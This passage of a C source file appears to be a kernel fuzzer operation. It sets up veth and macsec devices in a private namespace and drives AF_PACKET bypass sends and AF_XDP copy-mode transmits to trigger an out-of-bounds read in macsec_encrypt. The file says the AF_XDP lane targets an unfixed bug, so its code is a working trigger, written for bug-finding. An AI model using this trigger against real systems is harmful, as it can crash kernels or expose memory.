/*
 * packet_qdisc_bypass_unanchored_l2 - probe PACKET_QDISC_BYPASS and
 * AF_XDP copy-mode transmit paths with an unset skb MAC header on a
 * macsec device.
 *
 * Bug class:  __dev_direct_xmit() does not reset skb->mac_header before
 * handing the skb to ndo_start_xmit.  A driver that calls eth_hdr(skb)
 * in its xmit handler then reads skb->head + 65535 (the (u16)~0 sentinel
 * value left by alloc_skb).  macsec_encrypt is the identified victim from
 * the f5089008f90c KASAN report.
 *
 * Upstream fix c2707480cfbf (Doruk Tan Ozturk, 2026-07-24) patched one
 * producer — AF_PACKET with PACKET_QDISC_BYPASS.  The AF_XDP copy-mode
 * producer (net/xdp/xsk.c xsk_build_skb → __dev_direct_xmit) was never
 * swept.  skb_reset_mac_header() appears zero times in net/xdp/xsk.c at
 * HEAD (v7.2-rc6).
 *
 * Design:
 *   Setup: private user+net namespace; veth pair (veth0/veth1); macsec
 *   device (mst0) over veth0; bring all three interfaces up.
 *
 *   Lane A (regression test, fixed by c2707480cfbf):
 *     AF_PACKET sockets — SOCK_DGRAM, SOCK_RAW/ETH_P_IP, SOCK_PACKET —
 *     each with PACKET_QDISC_BYPASS=1.  sendto() into mst0 in a timed
 *     loop.  The fixed packet_parse_headers() now anchors mac_header;
 *     this lane confirms the harness reaches the transmit path.
 *
 *   Lane B (live twin, unfixed):
 *     AF_XDP socket with XDP_COPY flag bound to mst0 queue 0.  Minimal
 *     UMEM (64 KiB / 2 KiB chunks) + TX ring.  Write Ethernet frames
 *     into the UMEM and kick xsk_generic_xmit() via sendto(xsk_fd, NULL,
 *     0, MSG_DONTWAIT, NULL, 0).  xsk_build_skb() never calls
 *     skb_reset_mac_header(), so macsec_encrypt calls eth_hdr() against
 *     skb->head + 65535.
 *
 *   Oracle: KASAN slab-out-of-bounds read in macsec_encrypt / eth_hdr.
 *
 *   Stats: lane_a_sends / lane_b_sends / lane_a_errors / lane_b_errors
 *   show coverage even on non-KASAN builds.
 *
 * Latches:
 *   ns_unsupported_bypass_l2 — set on EPERM from userns_run_in_ns() or
 *   on EOPNOTSUPP/EAFNOSUPPORT from the AF_XDP / macsec create path so
 *   the op stays off for the remainder of this child's lifetime.
 *
 * Syscall smoke gate: sendto.
 */

#if __has_include(<sched.h>) && \
    __has_include(<linux/if_xdp.h>) && \
    __has_include(<linux/bpf.h>) && \
    __has_include(<linux/netlink.h>) && \
    __has_include(<linux/rtnetlink.h>) && \
    __has_include(<linux/if_packet.h>) && \
    __has_include(<linux/veth.h>)

#include <errno.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <sched.h>

#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <linux/if_xdp.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/veth.h>

#include "bpf-syscall.h"
#include "bpf.h"
#include "child.h"
#include "childop-outcome.h"
#include "childops-netlink.h"
#include "childops-util.h"
#include "jitter.h"
#include "kernel/if_xdp.h"
#include "random.h"
#include "shm.h"
#include "trinity.h"
#include "userns-bootstrap.h"

/* ------------------------------------------------------------------ */
/* UAPI fallbacks                                                        */
/* ------------------------------------------------------------------ */

#ifndef PACKET_QDISC_BYPASS
#define PACKET_QDISC_BYPASS		20
#endif

#ifndef SOL_XDP
#define SOL_XDP				283
#endif

#ifndef XDP_RX_RING
#define XDP_RX_RING			2
#endif
#ifndef XDP_TX_RING
#define XDP_TX_RING			3
#endif
#ifndef XDP_UMEM_REG
#define XDP_UMEM_REG			4
#endif
#ifndef XDP_UMEM_FILL_RING
#define XDP_UMEM_FILL_RING		5
#endif
#ifndef XDP_UMEM_COMPLETION_RING
#define XDP_UMEM_COMPLETION_RING	6
#endif
#ifndef XDP_MMAP_OFFSETS
#define XDP_MMAP_OFFSETS		1
#endif
#ifndef XDP_COPY
#define XDP_COPY			(1 << 1)
#endif
#ifndef XDP_PGOFF_TX_RING
#define XDP_PGOFF_TX_RING		0x80000000UL
#endif
#ifndef XDP_UMEM_PGOFF_FILL_RING
#define XDP_UMEM_PGOFF_FILL_RING	0x100000000ULL
#endif
#ifndef XDP_UMEM_PGOFF_COMPLETION_RING
#define XDP_UMEM_PGOFF_COMPLETION_RING	0x180000000ULL
#endif

/* AF_XDP address family number */
#ifndef AF_XDP
#define AF_XDP				44
#endif
#ifndef PF_XDP
#define PF_XDP				AF_XDP
#endif

/* ------------------------------------------------------------------ */
/* Constants                                                             */
/* ------------------------------------------------------------------ */

/* Latch: userns_run_in_ns() returned -EPERM, or AF_XDP/macsec probes
 * returned EOPNOTSUPP/EAFNOSUPPORT — leave the op off for the remainder
 * of this child's lifetime. */
static bool ns_unsupported_bypass_l2;

#define BYPASS_OUTER_BASE		1U
#define BYPASS_OUTER_CAP		3U

/* Worker wall-clock budget.  Lane A and B run in parallel; parent
 * SIGKILLs laggards at BYPASS_PARENT_WALL_NS. */
#define BYPASS_WORKER_WALL_NS		(200ULL * 1000ULL * 1000ULL)
#define BYPASS_PARENT_WALL_NS		(250ULL * 1000ULL * 1000ULL)

/* AF_PACKET send parameters */
#define BYPASS_SEND_ITERS		40U	/* sendto() calls per lane invocation */

/* AF_XDP UMEM parameters */
#define BYPASS_UMEM_SIZE		(64U * 1024U)	/* 64 KiB */
#define BYPASS_CHUNK_SIZE		2048U
#define BYPASS_NR_CHUNKS		(BYPASS_UMEM_SIZE / BYPASS_CHUNK_SIZE)
#define BYPASS_RING_ENTRIES		32U

/* Minimal Ethernet + zeroed payload frame size */
#define BYPASS_FRAME_LEN		64U

#define BYPASS_RTNL_BUF			512U

/* ------------------------------------------------------------------ */
/* Netlink helpers                                                       */
/* ------------------------------------------------------------------ */

/*
 * RTM_NEWLINK type=veth name=<name> peer=<peer>.
 */
static int bypass_create_veth(struct nl_ctx *ctx,
			      const char *name, const char *peer)
{
	unsigned char buf[BYPASS_RTNL_BUF];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi, *peer_ifi;
	size_t off, li_off, id_off, pv_off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family  = AF_UNSPEC;
	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, name);
	if (!off) return -EIO;

	li_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_LINKINFO);
	if (!off) return -EIO;
	off = nla_put_str(buf, off, sizeof(buf), IFLA_INFO_KIND, "veth");
	if (!off) return -EIO;

	id_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_INFO_DATA);
	if (!off) return -EIO;

	pv_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), VETH_INFO_PEER);
	if (!off) return -EIO;

	if (off + NLMSG_ALIGN(sizeof(*peer_ifi)) > sizeof(buf))
		return -EIO;
	peer_ifi = (struct ifinfomsg *)(buf + off);
	memset(peer_ifi, 0, sizeof(*peer_ifi));
	peer_ifi->ifi_family = AF_UNSPEC;
	off += NLMSG_ALIGN(sizeof(*peer_ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, peer);
	if (!off) return -EIO;

	nla_nest_end(buf, pv_off, off);
	nla_nest_end(buf, id_off, off);
	nla_nest_end(buf, li_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

/*
 * RTM_NEWLINK type=macsec name=<name> parent=<parent_ifindex>.
 * Creates a minimal macsec device with default SCI/key settings.
 * EOPNOTSUPP means CONFIG_MACSEC is not loaded; the caller latches.
 */
static int bypass_create_macsec(struct nl_ctx *ctx,
				const char *name, int parent_ifindex)
{
	unsigned char buf[BYPASS_RTNL_BUF];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off, li_off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family  = AF_UNSPEC;
	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, name);
	if (!off) return -EIO;

	/* IFLA_LINK specifies the underlying (parent) interface */
	off = nla_put_u32(buf, off, sizeof(buf), IFLA_LINK,
			  (__u32)parent_ifindex);
	if (!off) return -EIO;

	li_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_LINKINFO);
	if (!off) return -EIO;
	off = nla_put_str(buf, off, sizeof(buf), IFLA_INFO_KIND, "macsec");
	if (!off) return -EIO;
	nla_nest_end(buf, li_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

/*
 * RTM_NEWLINK IFF_UP on an interface identified by ifindex.
 */
static int bypass_set_link_up(struct nl_ctx *ctx, int ifindex)
{
	unsigned char buf[128];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family  = AF_UNSPEC;
	ifi->ifi_index   = ifindex;
	ifi->ifi_flags   = IFF_UP;
	ifi->ifi_change  = IFF_UP;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));
	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

/* ------------------------------------------------------------------ */
/* BPF: minimal XDP_PASS program for optional device attachment          */
/* ------------------------------------------------------------------ */

/*
 * Load a single-instruction XDP_PASS program: r0 = 2; exit.
 * Returns a prog fd >= 0 on success, -1 on failure (best-effort only;
 * Lane B works in copy mode even without an attached XDP prog for TX).
 */
static int bypass_load_xdp_pass(void)
{
	struct bpf_insn insns[] = {
		EBPF_MOV64_IMM(BPF_REG_0, 2),	/* XDP_PASS = 2 */
		EBPF_EXIT(),
	};
	union bpf_attr attr;
	char license[] = "GPL";

	memset(&attr, 0, sizeof(attr));
	attr.prog_type = BPF_PROG_TYPE_XDP;
	attr.insn_cnt  = 2;
	attr.insns     = (uintptr_t)insns;
	attr.license   = (uintptr_t)license;

	return sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

/*
 * Attach an XDP program to an interface via RTM_NEWLINK IFLA_XDP with
 * XDP_FLAGS_SKB_MODE (software/copy-mode generic path; the only mode
 * available on macsec-over-veth without a real NIC driver).
 * Best-effort: Lane B's xsk_generic_xmit() TX path does not require
 * a pre-attached program; failure here is not fatal.
 */
static void bypass_attach_xdp(struct nl_ctx *ctx, int ifindex, int prog_fd)
{
	unsigned char buf[256];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off, xdp_off;
	__u32 flags;

#ifndef XDP_FLAGS_SKB_MODE
#define XDP_FLAGS_SKB_MODE	(1U << 1)
#endif
#ifndef IFLA_XDP
#define IFLA_XDP		43
#endif
#ifndef IFLA_XDP_FD
#define IFLA_XDP_FD		1
#endif
#ifndef IFLA_XDP_FLAGS
#define IFLA_XDP_FLAGS		3
#endif

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family  = AF_UNSPEC;
	ifi->ifi_index   = ifindex;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));
	xdp_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_XDP);
	if (!off) return;

	off = nla_put(buf, off, sizeof(buf), IFLA_XDP_FD,
		      &prog_fd, sizeof(prog_fd));
	if (!off) return;

	flags = XDP_FLAGS_SKB_MODE;
	off = nla_put(buf, off, sizeof(buf), IFLA_XDP_FLAGS,
		      &flags, sizeof(flags));
	if (!off) return;

	nla_nest_end(buf, xdp_off, off);
	nlh->nlmsg_len = (__u32)off;
	(void)nl_send_recv(ctx, buf, off);	/* best-effort */
}

/* ------------------------------------------------------------------ */
/* Lane A: AF_PACKET with PACKET_QDISC_BYPASS                            */
/* ------------------------------------------------------------------ */

/*
 * Regression test lane.  Since c2707480cfbf, packet_parse_headers()
 * unconditionally calls skb_reset_mac_header(), so sends on a macsec
 * device no longer OOB-read.  This lane proves the transmit path is
 * reached; it should NOT trigger KASAN on a patched kernel.
 *
 * Runs BYPASS_SEND_ITERS sendto() calls across three socket types:
 *   SOCK_DGRAM        — sendto() takes a sockaddr_ll but supplies the L2
 *   SOCK_RAW/ETH_P_IP — raw with protocol binding
 *   SOCK_PACKET       — legacy BSD compat
 *
 * All three set PACKET_QDISC_BYPASS=1.  Errors are counted but the lane
 * never aborts — EPERM/ENOBUFS/ENODEV are all benign.
 */
static void lane_a_worker(unsigned int mst_ifindex, const char *mst_name,
			  int op_type)
{
	/* A minimal Ethernet frame: dst + src MACs + ethertype + zeros.
	 * SOCK_DGRAM: kernel prepends the L2 header; payload starts after.
	 * SOCK_RAW / SOCK_PACKET: we supply the full frame. */
	unsigned char frame[BYPASS_FRAME_LEN];
	struct sockaddr_ll sll;
	struct timespec t0, now;
	unsigned int i;
	unsigned long dc = 0;

	memset(frame, 0, sizeof(frame));
	/* Ethertype = IPv4 (0x0800) at offset 12 */
	frame[12] = 0x08;
	frame[13] = 0x00;

	memset(&sll, 0, sizeof(sll));
	sll.sll_family   = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex  = (int)mst_ifindex;

	if (clock_gettime(CLOCK_MONOTONIC, &t0) != 0)
		t0.tv_sec = 0;

	for (i = 0; i < BYPASS_SEND_ITERS; i++) {
		static const int sock_types[3] = {
			SOCK_DGRAM, SOCK_RAW, SOCK_PACKET
		};
		static const int protos[3] = {
			ETH_P_IP, ETH_P_IP, 0
		};
		int sock_type = sock_types[i % 3];
		int proto     = protos[i % 3];
		int bypass = 1;
		int fd;
		ssize_t r;

		/* Check wall clock every 8 iterations */
		if ((i & 7U) == 0U &&
		    clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
			unsigned long long elapsed =
				(unsigned long long)(now.tv_sec - t0.tv_sec) *
				1000000000ULL +
				(unsigned long long)(now.tv_nsec - t0.tv_nsec);
			if (elapsed >= BYPASS_WORKER_WALL_NS)
				break;
		}

		fd = socket(AF_PACKET, sock_type, htons((__u16)proto));
		dc++;
		if (fd < 0)
			continue;

		(void)setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS,
				 &bypass, sizeof(bypass));
		dc++;

		if (sock_type == SOCK_PACKET) {
			/* Legacy SOCK_PACKET uses struct sockaddr with
			 * sa_family=AF_PACKET and sa_data=iface_name */
			struct sockaddr sa;

			memset(&sa, 0, sizeof(sa));
			sa.sa_family = AF_PACKET;
			strncpy(sa.sa_data, mst_name,
				sizeof(sa.sa_data) - 1);
			r = sendto(fd, frame, sizeof(frame), MSG_DONTWAIT,
				   &sa, sizeof(sa));
		} else {
			r = sendto(fd, frame, sizeof(frame), MSG_DONTWAIT,
				   (struct sockaddr *)&sll, sizeof(sll));
		}
		dc++;

		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.lane_a_sends,
			1, __ATOMIC_RELAXED);
		if (r < 0)
			__atomic_add_fetch(
				&shm->stats.packet_qdisc_bypass_unanchored_l2.lane_a_errors,
				1, __ATOMIC_RELAXED);

		close(fd);
		dc++;
	}

	if (op_type >= 0 && op_type < NR_CHILD_OP_TYPES)
		childop_direct_syscalls_add((enum child_op_type)op_type, dc);
	_exit(0);
}

/* ------------------------------------------------------------------ */
/* Lane B: AF_XDP copy-mode — the live twin                              */
/* ------------------------------------------------------------------ */

/*
 * Per-invocation AF_XDP state.  Kept on the stack of the worker
 * function so teardown on any early-exit path is easy.
 */
struct xsk_bypass_state {
	int    xsk_fd;

	/* UMEM backing buffer */
	void  *umem_area;
	size_t umem_size;

	/* TX ring mapped region */
	void  *tx_ring;
	size_t tx_ring_sz;

	/* CQ (completion) ring mapped region */
	void  *cq_ring;
	size_t cq_ring_sz;

	/* Ring member offsets from XDP_MMAP_OFFSETS */
	__u64  tx_producer_off;
	__u64  tx_consumer_off;
	__u64  tx_desc_off;
	__u32  tx_ring_size;	/* number of slots */

	/* CQ consumer and producer offsets (userspace owns the consumer) */
	__u64  cq_consumer_off;
	__u64  cq_producer_off;
};

static void xsk_bypass_teardown(struct xsk_bypass_state *s)
{
	if (s->cq_ring != MAP_FAILED && s->cq_ring != NULL)
		(void)munmap(s->cq_ring, s->cq_ring_sz);
	if (s->tx_ring != MAP_FAILED && s->tx_ring != NULL)
		(void)munmap(s->tx_ring, s->tx_ring_sz);
	if (s->umem_area != MAP_FAILED && s->umem_area != NULL)
		(void)munmap(s->umem_area, s->umem_size);
	if (s->xsk_fd >= 0)
		(void)close(s->xsk_fd);
}

/*
 * Set up an AF_XDP socket in copy mode on interface <ifindex> queue 0.
 * Returns 0 on success, -1 on failure (caller should check errno if
 * errno is EOPNOTSUPP / EAFNOSUPPORT to latch ns_unsupported).
 */
static int xsk_bypass_setup(struct xsk_bypass_state *s, unsigned int ifindex)
{
	struct xdp_mmap_offsets off;
	socklen_t off_len = sizeof(off);
	struct sockaddr_xdp sxdp;
	uint32_t ring_entries = BYPASS_RING_ENTRIES;
	/* afxdp_umem_reg_compat from include/kernel/if_xdp.h */
	struct afxdp_umem_reg_compat ureg;
	int rc;

	/* --- UMEM mmap --- */
	s->umem_area = mmap(NULL, BYPASS_UMEM_SIZE,
			    PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (s->umem_area == MAP_FAILED) {
		s->umem_area = NULL;
		return -1;
	}
	s->umem_size = BYPASS_UMEM_SIZE;
	memset(s->umem_area, 0, BYPASS_UMEM_SIZE);

	/* --- Socket --- */
	s->xsk_fd = socket(AF_XDP, SOCK_RAW, 0);
	if (s->xsk_fd < 0)
		return -1;

	/* --- Register UMEM --- */
	memset(&ureg, 0, sizeof(ureg));
	ureg.addr       = (uintptr_t)s->umem_area;
	ureg.len        = BYPASS_UMEM_SIZE;
	ureg.chunk_size = BYPASS_CHUNK_SIZE;
	ureg.headroom   = 0;
	ureg.flags      = 0;
	rc = setsockopt(s->xsk_fd, SOL_XDP, XDP_UMEM_REG,
			&ureg, sizeof(ureg));
	if (rc < 0)
		return -1;

	/* --- Rings (all four required by the kernel before bind) --- */
	rc  = setsockopt(s->xsk_fd, SOL_XDP, XDP_TX_RING,
			 &ring_entries, sizeof(ring_entries));
	rc |= setsockopt(s->xsk_fd, SOL_XDP, XDP_UMEM_FILL_RING,
			 &ring_entries, sizeof(ring_entries));
	rc |= setsockopt(s->xsk_fd, SOL_XDP, XDP_UMEM_COMPLETION_RING,
			 &ring_entries, sizeof(ring_entries));
	if (rc < 0)
		return -1;

	/* --- Get ring mmap offsets --- */
	memset(&off, 0, sizeof(off));
	if (getsockopt(s->xsk_fd, SOL_XDP, XDP_MMAP_OFFSETS,
		       &off, &off_len) < 0 ||
	    off_len < (socklen_t)sizeof(off))
		return -1;

	s->tx_producer_off = off.tx.producer;
	s->tx_consumer_off = off.tx.consumer;
	s->tx_desc_off     = off.tx.desc;
	s->tx_ring_size    = BYPASS_RING_ENTRIES;
	s->cq_consumer_off = off.cr.consumer;
	s->cq_producer_off = off.cr.producer;

	/* TX ring size: desc_offset + entries * sizeof(struct xdp_desc) */
	s->tx_ring_sz = (size_t)off.tx.desc +
			(size_t)BYPASS_RING_ENTRIES * sizeof(struct xdp_desc);
	/* Round up to page boundary */
	{
		long pgsz = sysconf(_SC_PAGESIZE);

		if (pgsz <= 0)
			pgsz = 4096;
		s->tx_ring_sz = ((s->tx_ring_sz + (size_t)pgsz - 1) /
				 (size_t)pgsz) * (size_t)pgsz;
	}

	/* --- mmap TX ring --- */
	s->tx_ring = mmap(NULL, s->tx_ring_sz,
			  PROT_READ | PROT_WRITE,
			  MAP_SHARED | MAP_POPULATE,
			  s->xsk_fd, (off_t)XDP_PGOFF_TX_RING);
	if (s->tx_ring == MAP_FAILED) {
		s->tx_ring = NULL;
		return -1;
	}

	/* --- mmap CQ (completion) ring --- */
	{
		long pgsz = sysconf(_SC_PAGESIZE);
		size_t cq_sz;

		if (pgsz <= 0)
			pgsz = 4096;
		cq_sz = (size_t)off.cr.desc +
			(size_t)BYPASS_RING_ENTRIES * sizeof(__u64);
		cq_sz = ((cq_sz + (size_t)pgsz - 1) /
			 (size_t)pgsz) * (size_t)pgsz;
		s->cq_ring_sz = cq_sz;
	}
	s->cq_ring = mmap(NULL, s->cq_ring_sz,
			  PROT_READ | PROT_WRITE,
			  MAP_SHARED | MAP_POPULATE,
			  s->xsk_fd,
			  (off_t)XDP_UMEM_PGOFF_COMPLETION_RING);
	if (s->cq_ring == MAP_FAILED) {
		s->cq_ring = NULL;
		return -1;
	}

	/* --- bind in XDP_COPY mode (forces xsk_generic_xmit) --- */
	memset(&sxdp, 0, sizeof(sxdp));
	sxdp.sxdp_family   = AF_XDP;
	sxdp.sxdp_flags    = XDP_COPY;
	sxdp.sxdp_ifindex  = ifindex;
	sxdp.sxdp_queue_id = 0;

	rc = bind(s->xsk_fd, (struct sockaddr *)&sxdp, sizeof(sxdp));
	if (rc < 0)
		return -1;

	return 0;
}

/*
 * Enqueue one TX descriptor pointing at UMEM chunk 0 (pre-filled with a
 * minimal Ethernet frame) and kick xsk_generic_xmit via sendto().
 *
 * This is where the live bug fires: xsk_build_skb() puts the payload
 * into the skb without ever calling skb_reset_mac_header().  When
 * macsec_start_xmit calls macsec_encrypt → eth_hdr(skb), it reads
 * skb->head + (u16)~0 == skb->head + 65535 — a ~64 KiB OOB read.
 */
static void xsk_bypass_tx_kick(struct xsk_bypass_state *s, int xsk_fd)
{
	volatile uint32_t *prod;
	volatile uint32_t *cons;
	struct xdp_desc *desc;
	uint32_t prod_idx, cons_idx, used;
	ssize_t r;

	prod = (volatile uint32_t *)
		((char *)s->tx_ring + s->tx_producer_off);
	cons = (volatile uint32_t *)
		((char *)s->tx_ring + s->tx_consumer_off);
	desc = (struct xdp_desc *)
		((char *)s->tx_ring + s->tx_desc_off);

	/*
	 * Check how many TX slots the kernel has consumed.  If the ring
	 * is full (all BYPASS_RING_ENTRIES outstanding) we cannot safely
	 * publish another descriptor — skip this kick instead of
	 * overrunning the ring.
	 */
	prod_idx = __atomic_load_n(prod, __ATOMIC_RELAXED);
	cons_idx = __atomic_load_n(cons, __ATOMIC_ACQUIRE);
	used = prod_idx - cons_idx;
	if (used >= s->tx_ring_size)
		return;

	desc += prod_idx & (s->tx_ring_size - 1U);

	/* Point descriptor at UMEM chunk 0.  Fill it with a minimal
	 * Ethernet frame: dst=broadcast, src=zero, type=IPv4. */
	{
		unsigned char *pkt = (unsigned char *)s->umem_area;

		memset(pkt, 0xff, 6);	/* dst = ff:ff:ff:ff:ff:ff */
		memset(pkt + 6, 0, 6);	/* src = 00:00:00:00:00:00 */
		pkt[12] = 0x08;		/* ethertype = IPv4 */
		pkt[13] = 0x00;
	}

	desc->addr    = 0;		/* UMEM offset 0 */
	desc->len     = BYPASS_FRAME_LEN;
	desc->options = 0;

	/* Publish the descriptor with a release barrier so the descriptor
	 * store is visible to the kernel before the producer index update
	 * (libbpf uses __ATOMIC_RELEASE; required on non-x86 architectures). */
	__atomic_store_n(prod, prod_idx + 1U, __ATOMIC_RELEASE);

	/* Kick the kernel: xsk_sendmsg → xsk_generic_xmit */
	r = sendto(xsk_fd, NULL, 0, MSG_DONTWAIT, NULL, 0);

	__atomic_add_fetch(
		&shm->stats.packet_qdisc_bypass_unanchored_l2.lane_b_sends,
		1, __ATOMIC_RELAXED);
	if (r < 0) {
		if (errno == EAGAIN)
			__atomic_add_fetch(
				&shm->stats.packet_qdisc_bypass_unanchored_l2.lane_b_eagain,
				1, __ATOMIC_RELAXED);
		else
			__atomic_add_fetch(
				&shm->stats.packet_qdisc_bypass_unanchored_l2.lane_b_errors,
				1, __ATOMIC_RELAXED);
	}
}

/*
 * Lane B worker.  Set up the AF_XDP socket in copy mode and drive
 * xsk_generic_xmit() in a timed loop.  Self-bounded to
 * BYPASS_WORKER_WALL_NS; sendto errors are counted but not fatal.
 */
static void lane_b_worker(unsigned int mst_ifindex, int op_type)
{
	struct xsk_bypass_state s;
	struct timespec t0, now;
	unsigned int i;
	unsigned long dc = 0;
	int rc;

	memset(&s, 0, sizeof(s));
	s.xsk_fd   = -1;
	s.tx_ring  = NULL;
	s.umem_area = NULL;

	rc = xsk_bypass_setup(&s, mst_ifindex);
	dc += 4;	/* socket + umem_reg + rings + bind */
	if (rc < 0) {
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		/* Propagate EOPNOTSUPP/EAFNOSUPPORT to caller via exit code */
		if (errno == EOPNOTSUPP || errno == EAFNOSUPPORT)
			_exit(42);
		goto out;
	}

	if (clock_gettime(CLOCK_MONOTONIC, &t0) != 0)
		t0.tv_sec = 0;

	for (i = 0; i < BYPASS_SEND_ITERS; i++) {
		if ((i & 7U) == 0U &&
		    clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
			unsigned long long elapsed =
				(unsigned long long)(now.tv_sec - t0.tv_sec) *
				1000000000ULL +
				(unsigned long long)(now.tv_nsec - t0.tv_nsec);
			if (elapsed >= BYPASS_WORKER_WALL_NS)
				break;
		}
		xsk_bypass_tx_kick(&s, s.xsk_fd);
		dc++;

		/* Drain the CQ so the kernel can recycle TX descriptors.
		 * Userspace owns the CQ consumer; the kernel only produces.
		 * Without draining, the 32-entry CQ fills after 32 sends
		 * and xsk_cq_reserve_locked() blocks every subsequent kick
		 * with -EAGAIN for the socket's lifetime. */
		if (s.cq_ring != NULL && s.cq_ring != MAP_FAILED) {
			volatile uint32_t *cq_prod;
			volatile uint32_t *cq_cons;
			uint32_t cp, cc;

			cq_prod = (volatile uint32_t *)
				((char *)s.cq_ring + s.cq_producer_off);
			cq_cons = (volatile uint32_t *)
				((char *)s.cq_ring + s.cq_consumer_off);
			cp = __atomic_load_n(cq_prod, __ATOMIC_ACQUIRE);
			cc = __atomic_load_n(cq_cons, __ATOMIC_RELAXED);
			if (cp != cc)
				__atomic_store_n(cq_cons, cp, __ATOMIC_RELEASE);
		}
	}

out:
	xsk_bypass_teardown(&s);
	dc += 2;	/* munmap + close */

	if (op_type >= 0 && op_type < NR_CHILD_OP_TYPES)
		childop_direct_syscalls_add((enum child_op_type)op_type, dc);
	_exit(0);
}

/* ------------------------------------------------------------------ */
/* Worker reap helper                                                    */
/* ------------------------------------------------------------------ */

static void bypass_reap(pid_t pid, struct timespec *deadline,
			unsigned long *dc)
{
	for (;;) {
		struct timespec now;
		int status;
		pid_t r;

		r = waitpid_eintr(pid, &status, WNOHANG);
		*dc += 1;
		if (r == pid)
			return;
		if (r < 0 && errno != ECHILD)
			return;

		if (clock_gettime(CLOCK_MONOTONIC, &now) == 0 &&
		    (now.tv_sec > deadline->tv_sec ||
		     (now.tv_sec == deadline->tv_sec &&
		      now.tv_nsec >= deadline->tv_nsec))) {
			(void)kill(pid, SIGKILL);
			*dc += 1;
			(void)waitpid_eintr(pid, &status, 0);
			*dc += 1;
			return;
		}
		(void)usleep(2000);
	}
}

/* ------------------------------------------------------------------ */
/* In-namespace callback                                                 */
/* ------------------------------------------------------------------ */

struct bypass_ns_ctx {
	int            op_type;
	unsigned long  direct_calls;
	int            latch_errno;	/* non-zero → request latch */
};

static int iter_one_in_ns(void *arg)
{
	struct bypass_ns_ctx *ctx = arg;
	const int op_type = ctx->op_type;
	const bool valid_op = (op_type >= 0 && op_type < NR_CHILD_OP_TYPES);
	struct nl_ctx nl = { .fd = -1 };
	struct nl_open_opts opts = {
		.proto = NETLINK_ROUTE,
		.recv_timeo_s = 1,
	};
	unsigned int veth0_ifx, veth1_ifx, mst_ifx;
	int prog_fd = -1;
	pid_t pa = -1, pb = -1;
	struct timespec deadline;
	int rc;

	/* Open rtnetlink socket */
	if (nl_open(&nl, &opts) < 0) {
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		return 0;
	}

	/* Bring lo up (needed for ARP/NDP in the netns) */
	rtnl_bring_lo_up(&nl);

	/* Create veth pair: veth0 / veth1 */
	rc = bypass_create_veth(&nl, "veth0", "veth1");
	if (rc != 0) {
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		goto out_nl;
	}

	veth0_ifx = if_nametoindex("veth0");
	veth1_ifx = if_nametoindex("veth1");
	if (veth0_ifx == 0 || veth1_ifx == 0) {
